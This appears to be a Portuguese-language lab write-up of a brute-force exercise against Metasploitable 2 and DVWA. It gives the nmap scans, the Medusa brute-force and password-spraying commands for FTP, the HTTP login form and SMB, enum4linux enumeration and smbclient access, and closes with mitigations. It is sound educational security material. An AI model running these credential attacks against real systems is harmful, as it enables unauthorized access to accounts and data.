> **Ambiente de laboratório controlado** · WSL Kali Linux + Oracle VirtualBox + Metasploitable 2  
> **Finalidade:** Estudo prático de cibersegurança ofensiva e defensiva  
> ⚠️ *Este projeto foi realizado exclusivamente em ambiente isolado para fins educacionais. Nunca aplique estas técnicas em sistemas sem autorização explícita.*

---

## 📋 Índice

- [Visão Geral](#visão-geral)
- [Ambiente de Laboratório](#ambiente-de-laboratório)
- [Topologia de Rede](#topologia-de-rede)
- [Fase 1 — Reconhecimento](#fase-1--reconhecimento)
- [Fase 2 — Enumeração de Serviços](#fase-2--enumeração-de-serviços)
- [Fase 3 — Ataque Brute Force FTP](#fase-3--ataque-brute-force-ftp)
- [Fase 4 — Ataque Brute Force HTTP (DVWA)](#fase-4--ataque-brute-force-http-dvwa)
- [Fase 5 — Enumeração SMB com enum4linux](#fase-5--enumeração-smb-com-enum4linux)
- [Fase 6 — Password Spraying via SMB](#fase-6--password-spraying-via-smbnt)
- [Fase 7 — Acesso via smbclient](#fase-7--acesso-via-smbclient)
- [Resultados e Credenciais Obtidas](#resultados-e-credenciais-obtidas)
- [Lições de Segurança](#lições-de-segurança)
- [Referências](#referências)

---

## 🎯 Visão Geral

Este laboratório simula um ataque de **Brute Force** completo contra o **Metasploitable 2**, uma máquina virtual intencionalmente vulnerável criada pela Rapid7 para fins educacionais. O ataque abrange múltiplos vetores:

| Vetor | Protocolo | Ferramenta | Resultado |
|-------|-----------|------------|-----------|
| Login remoto | FTP (porta 21) | Medusa | ✅ Sucesso |
| Aplicação web | HTTP (porta 80) | Medusa | ✅ Sucesso |
| Rede Windows | SMB (porta 445) | Medusa + enum4linux | ✅ Sucesso |
| Partilhas de rede | SMB | smbclient | ✅ Acesso obtido |

---

## 🖥️ Ambiente de Laboratório

### Componentes

| Componente | Detalhes |
|-----------|---------|
| **Atacante** | WSL 2 — Kali Linux (Windows Subsystem for Linux) |
| **Alvo** | Metasploitable 2 — Oracle VirtualBox |
| **Rede** | Host-Only Adapter (isolada do exterior) |
| **IP do Alvo** | `192.168.1.10` |
| **Aplicação Web** | DVWA (Damn Vulnerable Web Application) |

### Ferramentas Utilizadas

| Ferramenta | Função |
|-----------|--------|
| `nmap` | Scanner de portas e deteção de serviços |
| `medusa` | Motor de brute force multi-protocolo |
| `enum4linux` | Enumeração de informações SMB/NetBIOS |
| `smbclient` | Cliente SMB para acesso a partilhas |
| `ftp` | Cliente FTP nativo |
| `ping` | Verificação de conectividade ICMP |

---

## 🌐 Topologia de Rede

```
┌─────────────────────────┐         ┌──────────────────────────┐
│   ATACANTE (Kali WSL)   │         │   ALVO (Metasploitable 2) │
│                         │         │                           │
│  ┌───────────────────┐  │         │  ┌─────────────────────┐  │
│  │  WSL 2 / Kali     │  │◄───────►│  │  Metasploitable 2   │  │
│  │  Linux            │  │  LAN    │  │  192.168.1.10        │  │
│  └───────────────────┘  │ (HO)   │  └─────────────────────┘  │
│                         │         │                           │
│  Ferramentas:           │         │  Serviços Expostos:       │
│  - medusa               │         │  - FTP (21)              │
│  - nmap                 │         │  - SSH (22)              │
│  - enum4linux           │         │  - HTTP/DVWA (80)        │
│  - smbclient            │         │  - SMB (139/445)         │
└─────────────────────────┘         └──────────────────────────┘
```

---

## 🔍 Fase 1 — Reconhecimento

### 1.1 Verificação de Conectividade

O primeiro passo é confirmar que o alvo está acessível na rede.

```bash
sudo ping 192.168.1.10
```

**Saída esperada:**
```
PING 192.168.1.10 (192.168.1.10) 56(84) bytes of data.
64 bytes from 192.168.1.10: icmp_seq=1 ttl=64 time=0.45 ms
64 bytes from 192.168.1.10: icmp_seq=2 ttl=64 time=0.38 ms
```

> 💡 **O que aprendemos:** O host está ativo e responde a ICMP. TTL=64 indica sistema Linux.

---

## 🛰️ Fase 2 — Enumeração de Serviços

### 2.1 Scan Completo com Nmap

```bash
nmap 192.168.1.10
```

Scan rápido de portas abertas para ter uma visão geral dos serviços.

### 2.2 Scan Detalhado com Detecção de Versão

```bash
nmap -sV -p 21,22,80,139,445 192.168.1.10
```

**Flags utilizadas:**
- `-sV` — Detecta versão dos serviços
- `-p 21,22,80,139,445` — Portas específicas: FTP, SSH, HTTP, NetBIOS, SMB

**Resultado do Scan:**

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1
80/tcp  open  http        Apache httpd 2.2.8
139/tcp open  netbios-ssn Samba smbd 3.X
445/tcp open  microsoft-ds Samba smbd 3.0.20
```

> ⚠️ **vsftpd 2.3.4** é famoso por conter um backdoor (CVE-2011-2523). **Samba 3.0.20** também tem vulnerabilidades críticas conhecidas.

### 2.3 Teste Manual de FTP

```bash
ftp 192.168.1.10
```

Verificação do banner e comportamento do serviço FTP antes do ataque automatizado.

---

## 💥 Fase 3 — Ataque Brute Force FTP

### 3.1 Criação das Wordlists

```bash
# Lista de utilizadores comuns
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

# Lista de passwords comuns
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

**Conteúdo dos ficheiros:**

```
users.txt          pass.txt
──────────         ──────────
user               123456
msfadmin           password
admin              qwerty
root               msfadmin
```

### 3.2 Instalação do Medusa

```bash
sudo apt install medusa
```

### 3.3 Execução do Ataque Brute Force FTP

```bash
medusa -h 192.168.1.10 -U users.txt -P pass.txt -M ftp -t 6
```

**Flags do Medusa:**

| Flag | Descrição |
|------|-----------|
| `-h` | Host alvo |
| `-U` | Ficheiro com lista de utilizadores |
| `-P` | Ficheiro com lista de passwords |
| `-M ftp` | Módulo do protocolo (FTP) |
| `-t 6` | Número de threads paralelas |

**Resultado:**
```
ACCOUNT FOUND: [ftp] Host: 192.168.1.10  User: msfadmin  Password: msfadmin  [SUCCESS]
```

### 3.4 Acesso FTP Confirmado

```bash
ftp 192.168.1.10
# Utilizador: msfadmin
# Password:   msfadmin
```

> ✅ **Acesso FTP obtido** com as credenciais `msfadmin:msfadmin`

---

## 🌐 Fase 4 — Ataque Brute Force HTTP (DVWA)

### 4.1 Sobre o DVWA

O **Damn Vulnerable Web Application (DVWA)** é uma aplicação web PHP/MySQL propositadamente vulnerável, instalada no Metasploitable 2 em `http://192.168.1.10/dvwa/`. Permite praticar ataques web de forma legal e controlada.

### 4.2 Ataque ao Formulário de Login

```bash
medusa -h 192.168.1.10 \
  -U users.txt \
  -P pass.txt \
  -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m 'FAIL=Login failed' \
  -t 6
```

**Parâmetros HTTP específicos:**

| Parâmetro | Significado |
|-----------|-------------|
| `-M http` | Módulo HTTP do Medusa |
| `PAGE:/dvwa/login.php` | Página alvo do formulário |
| `^USER^` | Placeholder substituído pelo utilizador atual |
| `^PASS^` | Placeholder substituído pela password atual |
| `FAIL=Login failed` | String que indica falha de autenticação |

**Resultado:**
```
ACCOUNT FOUND: [http] Host: 192.168.1.10  User: admin  Password: password  [SUCCESS]
```

> ✅ **Acesso DVWA obtido** com as credenciais `admin:password`

**Login confirmado em:** `http://192.168.1.10/dvwa/login.php`

---

## 🗂️ Fase 5 — Enumeração SMB com enum4linux

### 5.1 O que é o enum4linux?

`enum4linux` é uma ferramenta de enumeração para sistemas Linux/Windows que extrai informações de partilhas SMB, utilizadores, grupos, políticas de senha e muito mais — sem necessitar de autenticação prévia.

### 5.2 Instalação

```bash
sudo apt install enum4linux
```

### 5.3 Enumeração Completa

```bash
enum4linux -a 192.168.1.10 | tee enum4_output.txt
```

**Flag `-a`:** Realiza todas as verificações disponíveis:
- Informações do domínio/workgroup
- Lista de utilizadores do sistema
- Lista de partilhas de rede
- Políticas de password
- Informações do sistema operativo

**Excerto do output obtido:**

```
 ========================== 
|    Target Information    |
 ==========================
Target ........... 192.168.1.10
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ===========================
|    Users on 192.168.1.10 |
 ===========================
user:[msfadmin]  rid:[0x3e8]
user:[service]   rid:[0x3eb]
user:[user]      rid:[0x3ec]

 =====================================
|    Share Enumeration on 192.168.1.10|
 =====================================
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
IPC$            IPC       IPC Service
ADMIN$          IPC       IPC Service
```

> 💡 **Informação crítica obtida:** Lista de utilizadores reais do sistema sem necessitar de autenticação — uma vulnerabilidade grave de exposição de informação.

---

## 🔑 Fase 6 — Password Spraying via SMBNT

### 6.1 Criação das Wordlists SMB

Com os utilizadores descobertos pelo enum4linux, criamos wordlists mais direcionadas:

```bash
# Utilizadores descobertos pelo enum4linux
echo -e "user\nmsfadmin\nservice" > smb_users.txt

# Passwords comuns para password spraying
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
```

### 6.2 Ataque SMB com Medusa

```bash
medusa -h 192.168.1.10 \
  -U smb_users.txt \
  -P senhas_spray.txt \
  -M smbnt \
  -t 2 \
  -T 50
```

**Diferença entre `-t` e `-T`:**

| Flag | Significado |
|------|-------------|
| `-t 2` | Threads por host (conexões simultâneas) |
| `-T 50` | Total de hosts paralelos (irrelevante com 1 alvo) |
| `-M smbnt` | Módulo NTLM para autenticação SMB |

**Resultado:**
```
ACCOUNT FOUND: [smbnt] Host: 192.168.1.10  User: msfadmin  Password: msfadmin  [SUCCESS]
```

---

## 📂 Fase 7 — Acesso via smbclient

### 7.1 Listagem de Partilhas SMB

```bash
smbclient -L //192.168.1.10 -U msfadmin
```

**Saída:**

```
Enter WORKGROUP\msfadmin's password: msfadmin

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (metasploitable server)
        ADMIN$          IPC       IPC Service (metasploitable server)
```

### 7.2 Acesso à Partilha /tmp

```bash
smbclient //192.168.1.10/tmp -U msfadmin
```

> ✅ **Acesso SMB completo** confirmado. A partilha `/tmp` estava acessível com comentário "oh noes!" — indicativo intencional de vulnerabilidade.

---

## 🏆 Resultados e Credenciais Obtidas

### Sumário de Acessos

| Serviço | URL/Endpoint | Utilizador | Password | Método |
|---------|-------------|------------|----------|--------|
| FTP | `ftp://192.168.1.10` | `msfadmin` | `msfadmin` | Brute Force (Medusa) |
| HTTP/DVWA | `http://192.168.1.10/dvwa/` | `admin` | `password` | Brute Force HTTP (Medusa) |
| SMB/CIFS | `//192.168.1.10/` | `msfadmin` | `msfadmin` | Password Spray (Medusa) |

### Utilizadores Enumerados (sem autenticação)

Via `enum4linux`:
- `msfadmin`
- `service`
- `user`

### Partilhas de Rede Descobertas

- `print$` — Drivers de impressora
- `tmp` — Diretório temporário (acesso aberto)
- `opt` — Diretório opcional
- `IPC$` — Canal IPC do sistema

---

## 🛡️ Lições de Segurança

### Vulnerabilidades Exploradas

```
┌─────────────────────────────────────────────────────────┐
│  1. Credenciais padrão não alteradas (default creds)    │
│     → msfadmin:msfadmin, admin:password                 │
├─────────────────────────────────────────────────────────┤
│  2. Ausência de rate limiting / bloqueio por tentativas │
│     → Medusa conseguiu fazer centenas de tentativas     │
├─────────────────────────────────────────────────────────┤
│  3. Enumeração SMB sem autenticação                     │
│     → enum4linux listou todos os utilizadores           │
├─────────────────────────────────────────────────────────┤
│  4. Partilhas de rede mal configuradas                  │
│     → /tmp acessível publicamente                       │
├─────────────────────────────────────────────────────────┤
│  5. Versões desatualizadas com CVEs conhecidas          │
│     → vsftpd 2.3.4 (backdoor), Samba 3.0.20            │
└─────────────────────────────────────────────────────────┘
```

### Como Mitigar Estes Ataques

| Vulnerabilidade | Mitigação Recomendada |
|----------------|----------------------|
| Credenciais padrão | Alterar todas as passwords no primeiro acesso |
| Ausência de bloqueio | Implementar fail2ban ou rate limiting |
| Enumeração SMB | Desativar sessões null / autenticação anónima |
| Partilhas expostas | Restringir ACLs nas partilhas de rede |
| Sofware desatualizado | Manter todos os serviços atualizados (patch management) |
| Passwords fracas | Implementar política de passwords fortes + MFA |

### Boas Práticas de Segurança

```bash
# Exemplo: Instalar e configurar fail2ban para proteção contra brute force
sudo apt install fail2ban
sudo systemctl enable fail2ban

# Exemplo: Verificar tentativas de login falhadas no Linux
sudo grep "Failed password" /var/log/auth.log | tail -20

# Exemplo: Bloquear IP manualmente
sudo iptables -A INPUT -s 192.168.1.100 -j DROP
```

---

## 📚 Referências

| Recurso | Descrição |
|---------|-----------|
| [Metasploitable 2 Documentation](https://docs.rapid7.com/metasploit/metasploitable-2/) | Documentação oficial do alvo |
| [DVWA GitHub](https://github.com/digininja/DVWA) | Repositório do Damn Vulnerable Web App |
| [Medusa Man Page](http://foofus.net/goons/jmk/medusa/medusa.html) | Documentação completa do Medusa |
| [Nmap Reference Guide](https://nmap.org/book/man.html) | Guia de referência do Nmap |
| [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) | Repositório do enum4linux |
| [OWASP Brute Force](https://owasp.org/www-community/attacks/Brute_force_attack) | OWASP sobre ataques de brute force |
| [MITRE ATT&CK T1110](https://attack.mitre.org/techniques/T1110/) | Técnica de Brute Force no framework MITRE |

---

## ⚖️ Aviso Legal

> Este laboratório foi conduzido exclusivamente num ambiente isolado e controlado, utilizando o **Metasploitable 2** — uma máquina virtual criada especificamente para ser vulnerável e usada em treinos de cibersegurança.
>
> **Nunca aplique estas técnicas em sistemas reais sem autorização expressa e por escrito do proprietário.**  
> A realização de ataques não autorizados é crime em Angola (Lei 23/11 da Cibercriminalidade) e em praticamente todos os países.
>
> O objetivo deste projeto é **educacional**: compreender como os ataques funcionam para melhor se defender contra eles.

---

<div align="center">

**Desenvolvido para fins educativos de Cibersegurança**  
🔐 *"Know your enemy to defend yourself"*

</div>
